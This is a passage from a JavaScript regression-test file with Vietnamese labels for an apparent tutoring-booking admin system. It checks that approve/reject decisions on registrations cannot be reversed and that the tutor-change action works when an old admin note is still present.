  assert.strictEqual(Number(c.sp('SP00003').comp_days_admin), 5, 'phần kéo dài vào comp_days_admin');
  assert.strictEqual(api.pkgCompReady_(), true);
});

t('I135', 'Soát tài liệu 5Q (hồi quy): chọn Từ chối sau khi đã Duyệt (và ngược lại) không đổi gì, ô trả về kết quả thật, câu báo nói rõ; Đổi tutor khi admin_note còn chữ cũ vẫn lấy đúng mã tutor hoặc tự chọn', () => {
  const c = mk('2026-10-12 10:00'), { api } = c;
  const set = (id, v) => { api.withLock_(() => { const t = api.table_('REGISTRATIONS'); t.update(t.byId(id), { admin_action: v }); }); return api.handleAdminEdit_('REGISTRATIONS', 'admin_action', id, v, 'admin@thaiput.vn'); };
  const r1 = api.submitRegistration_(c.form({ email: 'moi1@student.test', name: 'Mới 1', package_code: 'PASS_1M' }));
  assert.ok(set(r1.regId, 'Duyệt').message.indexOf('Đã duyệt') === 0);
  const back = set(r1.regId, 'Từ chối');
  assert.ok(back.already && /đã duyệt trước đó, KHÔNG đổi được/.test(back.message), back.message);
  api.clearDbCache_();
  assert.strictEqual(api.table_('REGISTRATIONS').byId(r1.regId).admin_action, 'Duyệt', 'ô trả về Duyệt');
  const r2 = api.submitRegistration_(c.form({ email: 'moi2@student.test', name: 'Mới 2', package_code: 'PASS_1M' }));
  set(r2.regId, 'Từ chối');
  const back2 = set(r2.regId, 'Duyệt');
  assert.ok(back2.already && /đã từ chối trước đó/.test(back2.message));
  api.clearDbCache_();
  assert.strictEqual(api.table_('REGISTRATIONS').byId(r2.regId).admin_action, 'Từ chối');
  assert.ok(!api.userByEmail_('moi2@student.test'), 'không tạo tài khoản');
  // Đổi tutor: admin_note còn chữ cũ
  c.onlyOpen(K(14, 10), '19:00', ['T001']); c.setSlot('T002', K(14, 10), '19:00', 'OPEN');
  const [bk] = c.book('S003', [[K(14, 10), '19:00']]);
  api.withLock_(() => { const t = api.table_('BOOKINGS'); t.update(t.byId(bk.bookingId), { admin_note: 'Lỗi: Đổi tutor (không có tutor) · 12/10 10:00 · admin' }); });
  const o = pickAdmin(c, bk.bookingId, 'Đổi tutor');
  assert.ok(o && o.ok !== false, JSON.stringify(o));
  api.clearDbCache_();
  const after = api.table_('BOOKINGS').byId(bk.bookingId);
  assert.ok(after.tutor_id !== 'T001' || after.status !== 'CONFIRMED', JSON.stringify({ t: after.tutor_id, s: after.status, n: after.admin_note }));
});

module.exports = { results };
if (require.main === module) {
  results.forEach(r => console.log((r.ok ? '  ĐẠT       ' : '  KHÔNG ĐẠT ') + r.id + '  ' + r.title + (r.ok ? '' : '\n              ' + r.err)));
  process.exit(results.some(r => !r.ok) ? 1 : 0);
}
